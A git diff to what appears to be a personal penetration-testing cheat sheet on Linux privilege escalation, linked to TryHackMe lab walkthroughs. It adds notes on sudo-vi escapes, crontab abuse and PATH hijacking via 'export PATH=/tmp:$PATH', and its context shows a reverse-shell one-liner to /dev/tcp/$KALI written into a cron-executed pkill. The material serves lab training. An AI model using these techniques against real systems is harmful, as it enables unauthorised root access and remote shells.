@@ -51,11 +51,11 @@ sudo -l
 
 
 
-| Finding      | Comment              | Examples                                                                      |
-| ------------ | -------------------- | ----------------------------------------------------------------------------- |
-| yum          | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention") |
-| anansi\_util | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")   |
-|              |                      |                                                                               |
+| Finding      | Comment              | Examples                                                                                                       |
+| ------------ | -------------------- | -------------------------------------------------------------------------------------------------------------- |
+| yum          | Privilege Escalation | [daily-bugle.md](../../../../walkthroughs/tryhackme/daily-bugle.md "mention")                                  |
+| anansi\_util | Privilege Escalation | [brainpan-1.md](../../../../walkthroughs/tryhackme/brainpan-1.md "mention")                                    |
+| vi           |                      | [#escaping-vi-editor](../../../../walkthroughs/tryhackme/common-linux-privesc.md#escaping-vi-editor "mention") |
 
 ### **LD\_PRELOAD**
 
@@ -135,7 +135,7 @@ getcap -r / 2>/dev/null
 
 **Examples**
 
-[hacker-vs.-hacker.md](../../../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")
+[hacker-vs.-hacker.md](../../../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")[#exploiting-crontab](../../../../walkthroughs/tryhackme/common-linux-privesc.md#exploiting-crontab "mention")
 
 Look at the paths, below is an example of a cronjob. it first looks at /home/lachlan/bin before /bin and /usr/bin. therefore we can change pkill because it doesn't use the exact path in the cronjob. This means we can put a new file called /home/lachlan/bin/pkill with whatever we want and it will run as root.
 
@@ -162,6 +162,28 @@ echo "bash -c 'bash -i >& /dev/tcp/$KALI/1338 0>&1'" > /home/lachlan/bin/pkill ;
 ```
 
 
+
+### **Add path**
+
+**Example**
+
+[#exploiting-path-variable](../../../../walkthroughs/tryhackme/common-linux-privesc.md#exploiting-path-variable "mention")
+
+If a cron job is not specfiying the full path we may be able to change it to go towards another file.
+
+Before we change the path we can see ls goes to /bin/ls
+
+![](<../../../../.gitbook/assets/image (8) (7) (1).png>)
+
+Now after running the below command ls is now directed to our script.
+
+**Victim**
+
+```
+export PATH=/tmp:$PATH
+```
+
+<figure><img src="../../../../.gitbook/assets/image (14) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
